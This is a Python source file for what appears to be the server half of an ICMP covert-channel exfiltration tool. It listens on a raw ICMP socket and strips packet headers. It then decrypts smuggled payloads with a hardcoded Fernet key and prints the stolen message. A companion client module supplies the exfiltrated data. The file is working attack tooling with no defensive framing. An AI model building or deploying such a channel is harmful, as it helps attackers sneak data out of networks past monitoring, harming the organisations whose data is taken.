import socket, struct
from cryptography.fernet import Fernet

from client import EXFIL_MESSAGE

ICMP_HEADER_FMT = "bbHHh"
ICMP_DATA_FMT = "s"
KEY = b'QQ1m1OL9u22qNWNfUtj8fQwXuPLIfF7aBoQPi-x5d9M='

def server():
    _socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    print("Listening for ICMP packets on: " + str(_socket.getsockname()))

    while True:
        # Receive the packet
        packet, source = _socket.recvfrom(65535)
        if packet is not None:
            print("received packet:" + str(packet) + " from " + str(source))

        # Extract the data from the packet
        data = packet[28:]
        encryped_exfil_message = struct.pack(f'{len(packet[28:])}' + ICMP_DATA_FMT, data)

        # Decrypt the data
        fernet = Fernet(KEY)
        decrypted_exfil_message = fernet.decrypt(encryped_exfil_message)

        # Print the decrypted data
        print(decrypted_exfil_message)

def main():
    server()

if __name__ == '__main__':
    main()